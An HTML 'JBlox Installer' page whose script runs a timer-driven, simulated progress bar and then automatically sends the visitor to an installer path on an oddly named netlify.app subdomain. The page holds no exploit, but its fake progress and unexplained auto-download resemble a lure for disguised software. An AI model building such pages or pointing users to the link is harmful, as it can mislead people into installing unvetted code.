<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Install JBlox!">
    <title>JBlox Installer</title>

    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .progress-container {
            width: 300px;
            height: 30px;
            background-color: #e0e0e0;
            border-radius: 15px;
            overflow: hidden;
            margin-bottom: 20px;
        }
        .progress-bar {
            height: 100%;
            width: 0%;
            background-color: green;
            transition: width 0.5s ease;
        }
    </style>
</head>
<body>

    <div class="progress-container">
        <div class="progress-bar" id="progress-bar"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const progressBar = document.getElementById('progress-bar');
            let progress = 0;

            // Simulate loading progress
            const progressInterval = setInterval(() => {
                progress += 4;
                progressBar.style.width = progress + '%';

                // When progress reaches 100%, stop interval and redirect
                if (progress >= 100) {
                    clearInterval(progressInterval);
                    redirectToInstaller(); // Redirect to the specified URL
                }
            }, 500);
        });

        // Function to redirect to the installer URL
        function redirectToInstaller() {
            window.location.href = 'https://jbloxi12345678910btjapifix.netlify.app/assets/installer/is';
        }
    </script>

</body>
</html>
